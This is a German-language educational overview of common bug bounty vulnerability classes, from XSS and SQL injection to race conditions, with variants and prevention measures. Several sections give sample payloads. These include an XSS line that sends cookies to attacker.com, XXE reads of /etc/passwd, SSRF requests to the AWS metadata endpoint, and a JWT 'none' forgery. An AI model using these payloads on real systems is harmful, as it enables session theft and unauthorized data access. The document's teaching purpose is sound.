# Häufige Exploits in Bug-Bounty-Programmen

## 1. Web-Anwendungen

### 1.1 Cross-Site Scripting (XSS)
**Beschreibung:** Einschleusung von bösartigem JavaScript in eine Webseite, das im Browser anderer Benutzer ausgeführt wird.

**Varianten:**
- **Reflected XSS**: Bösartiger Code wird in der URL oder anderen HTTP-Parametern reflektiert
- **Stored XSS**: Bösartiger Code wird in der Datenbank gespeichert und später angezeigt
- **DOM-based XSS**: Manipulation des DOM im Browser ohne Serverinteraktion

**Beispiel-Payloads:**
```
<script>alert(document.cookie)</script>
<img src="x" onerror="alert(1)">
<svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**Prävention:**
- Kontextspezifische Ausgabekodierung
- Content Security Policy (CSP)
- Input-Validierung
- HTTPOnly-Cookies

### 1.2 SQL Injection
**Beschreibung:** Einschleusung von SQL-Befehlen in Anwendungseingaben, die dann auf der Datenbank ausgeführt werden.

**Varianten:**
- **Union-based**: Datenextraktion durch UNION-Befehle
- **Error-based**: Ausnutzung von Fehlerberichten zur Datengewinnung
- **Blind**: Ableitung von Informationen durch boolesche Bedingungen oder Zeitverzögerungen
- **Second-order**: Injizierter Code wird gespeichert und später in anderem Kontext ausgeführt

**Beispiel-Payloads:**
```
' OR 1=1 --
' UNION SELECT username, password FROM users --
'; WAITFOR DELAY '0:0:10' --
```

**Prävention:**
- Prepared Statements
- ORM-Frameworks
- Input-Validierung
- Least-Privilege-Datenbankbenutzer

### 1.3 Server-Side Request Forgery (SSRF)
**Beschreibung:** Manipulation der Anwendung, um Anfragen an interne Server oder Dienste zu senden.

**Varianten:**
- **Basic SSRF**: Direkter Zugriff auf interne Ressourcen
- **Blind SSRF**: Ohne direkte Antwort, aber mit beobachtbaren Seiteneffekten
- **SSRF via Protokollmissbrauch**: Verwendung verschiedener URL-Schemas (file://, dict://, gopher://)

**Beispiel-Payloads:**
```
https://vulnerable-app.com/fetch?url=http://localhost/admin
https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/ (AWS)
https://vulnerable-app.com/fetch?url=file:///etc/passwd
```

**Prävention:**
- Whitelisting von Domains/IPs
- Blacklisting privater IP-Bereiche
- Verwendung von Proxy-Servern
- Einschränkung erlaubter Protokolle

### 1.4 XML External Entity (XXE)
**Beschreibung:** Ausnutzung von XML-Parsern, die externe Entitäten verarbeiten, um Dateien zu lesen oder Netzwerkanfragen zu initiieren.

**Varianten:**
- **Classic XXE**: Direkte Dateiauslesung
- **Blind XXE**: Exfiltration über Out-of-Band-Kanäle
- **Error-based XXE**: Ausnutzung von Fehlermeldungen zur Dateiauslesung

**Beispiel-Payloads:**
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

**Prävention:**
- Deaktivierung von DTD-Verarbeitung
- Verwendung alternativer Datenformate (JSON)
- XML-Parser aktualisieren
- Eingabevalidierung

## 2. Authentifizierung und Autorisierung

### 2.1 Insecure Direct Object References (IDOR)
**Beschreibung:** Zugriff auf Ressourcen durch Manipulation von Objektreferenzen ohne ordnungsgemäße Autorisierungsprüfung.

**Varianten:**
- **Nummernbasierte IDOR**: Manipulation von IDs in URLs oder Parametern
- **Referenzbasierte IDOR**: Manipulation von Dateinamen oder anderen Referenzen
- **IDOR in APIs**: Unzureichende Zugriffskontrolle in API-Endpunkten

**Beispiel-Payloads:**
```
https://example.com/account?id=123 -> https://example.com/account?id=124
https://example.com/api/users/profile -> https://example.com/api/admin/profile
```

**Prävention:**
- Zugriffskontrollen auf Serverseite
- Indirekte Objektreferenzen
- Kontextbasierte Authentifizierung
- API-Autorisierungsprüfungen

### 2.2 JWT-basierte Schwachstellen
**Beschreibung:** Ausnutzung von Schwachstellen in der Implementierung von JSON Web Tokens.

**Varianten:**
- **Algorithmus-Umstellung**: Änderung des Algorithmus auf "none" oder RS256 zu HS256
- **Key Confusion**: Verwendung des öffentlichen Schlüssels als geheimer Schlüssel
- **Unsichere Verifizierung**: Fehlende oder unzureichende Signaturprüfung

**Beispiel-Payloads:**
```
# Änderung des Algorithmus auf "none"
{
  "alg": "none",
  "typ": "JWT"
}.{
  "user": "admin",
  "role": "administrator"
}.
```

**Prävention:**
- Gültige Algorithmen einschränken
- Signaturprüfung erzwingen
- Sichere Schlüsselverwaltung
- Kurze Token-Gültigkeitsdauer

### 2.3 OAuth/OpenID Schwachstellen
**Beschreibung:** Ausnutzung von Schwachstellen in OAuth oder OpenID Connect Implementierungen.

**Varianten:**
- **Open Redirect**: Umleitung zu bösartigen Domains
- **State Parameter**: Fehlender oder unzureichend geprüfter State-Parameter
- **Client ID Missbrauch**: Verwendung von Client IDs anderer Anwendungen

**Beispiel-Payloads:**
```
https://example.com/oauth/callback?code=ABC123&state=XYZ&redirect_uri=https://attacker.com
```

**Prävention:**
- Validierung des State-Parameters
- Strenge Redirect-URI-Prüfung
- Sichere Client-Secrets
- PKCE für öffentliche Clients

## 3. Mobile Anwendungen

### 3.1 Unsichere Datenspeicherung
**Beschreibung:** Ungeschützte Speicherung sensibler Daten auf mobilen Geräten.

**Varianten:**
- **Klartext-Speicherung**: Sensible Daten in Klartext gespeichert
- **Unsichere Verschlüsselung**: Schwache Algorithmen oder hartcodierte Schlüssel
- **External Storage**: Speicherung sensibler Daten auf externen Medien

**Prävention:**
- Sichere Keystore-APIs verwenden
- Minimierung gespeicherter sensibler Daten
- Starke Verschlüsselungsalgorithmen
- App-spezifischer interner Speicher

### 3.2 Client-Side-Injection
**Beschreibung:** Einschleusung von bösartigem Code in mobile Anwendungen.

**Varianten:**
- **WebView-Injection**: JavaScript-Injection in WebViews
- **Intent-based Injection**: Manipulation von Intents zur Codeausführung
- **Dynamisches Laden**: Unsicheres Laden externer Code-Ressourcen

**Prävention:**
- JavaScript-Interfaces sichern
- Intent-Filter und -Validierung
- Code-Signaturprüfung
- WebView-Härtung

## 4. API-Sicherheit

### 4.1 Broken Object Level Authorization
**Beschreibung:** Fehlende Autorisierungsprüfungen auf API-Ebene, die unberechtigten Zugriff ermöglichen.

**Varianten:**
- **Horizontale Berechtigungsverletzung**: Zugriff auf Daten anderer Benutzer gleicher Ebene
- **Vertikale Berechtigungsverletzung**: Zugriff auf Funktionen höherer Berechtigungsstufen
- **Massendaten-Exfiltration**: Unbegrenzte Datenabfragen ohne angemessene Beschränkungen

**Prävention:**
- Konsequente Autorisierungsprüfungen
- Ressourcenbasierte Zugriffskontrolle
- Attributbasierte Zugriffskontrolle (ABAC)
- API-Gateways mit Autorisierungslogik

### 4.2 Unsichere API-Konfiguration
**Beschreibung:** Fehlkonfigurationen, die API-Sicherheit beeinträchtigen.

**Varianten:**
- **Übermäßige Datenfreigabe**: Zu viele Informationen in Antworten
- **Fehlende Rate Limits**: Ermöglicht Brute-Force oder DoS
- **CORS-Fehlkonfiguration**: Zu permissive Cross-Origin-Richtlinien

**Prävention:**
- API-Dokumentation und Sicherheitsreviews
- Rate Limiting und Quotas
- Strenge CORS-Richtlinien
- Minimalprinzip für Datenrückgabe

## 5. Server und Infrastruktur

### 5.1 Container-Escape
**Beschreibung:** Ausbrechen aus Container-Umgebungen auf das Host-System.

**Varianten:**
- **Privileged Container**: Container mit übermäßigen Rechten
- **Shared Namespaces**: Gemeinsame Nutzung kritischer Namespaces
- **Kernel-Exploits**: Ausnutzung von Kernel-Schwachstellen

**Prävention:**
- Minimale Container-Rechte
- Regelmäßige Container-Image-Updates
- Sicherheitskontext einschränken
- Container-Runtime-Sicherheit

### 5.2 Cloud-Fehlkonfigurationen
**Beschreibung:** Unsichere Konfigurationen von Cloud-Ressourcen.

**Varianten:**
- **Öffentliche S3-Buckets**: Unbeschränkter Zugriff auf Speicher
- **Übermäßige IAM-Rechte**: Zu großzügige Berechtigungen
- **Ungeschützte Datenbanken**: Direkt aus dem Internet zugängliche DBs
- **Fehlende Netzwerksegmentierung**: Alle Dienste im gleichen Netzwerk

**Prävention:**
- Cloud Security Posture Management
- Least-Privilege-Prinzip für IAM
- Regelmäßige Sicherheitsaudits
- Netzwerksegmentierung und Firewalls

## 6. Fortgeschrittene Techniken

### 6.1 Race Conditions
**Beschreibung:** Ausnutzung von zeitlichen Abläufen und parallelen Verarbeitungsproblemen.

**Varianten:**
- **Time-of-Check/Time-of-Use (TOCTOU)**: Zustandsänderung zwischen Prüfung und Verwendung
- **Parallelanfragen**: Gleichzeitige Anfragen zur Umgehung von Limits oder Zählern
- **Atomare Operationen**: Fehlende Atomizität bei kritischen Transaktionen

**Prävention:**
- Atomare Operationen
- Sperrmechanismen
- Idempotente API-Endpunkte
- Transaktionale Integrität

### 6.2 Business Logic Fehler
**Beschreibung:** Ausnutzung von Fehlern in der Geschäftslogik einer Anwendung.

**Varianten:**
- **Preismanipulation**: Änderung von Preisen oder Mengen in E-Commerce
- **Gutschein-Missbrauch**: Mehrfachverwendung oder -kombination von Gutscheinen
- **Statusübergangs-Manipulation**: Umgehung von Workflow-Schritten

**Prävention:**
- Gründliches Testen der Geschäftslogik
- Serverseitige Validierung aller Parameter
- Zustandsvalidierung bei jedem Schritt
- Kontextbezogene Prüfungen 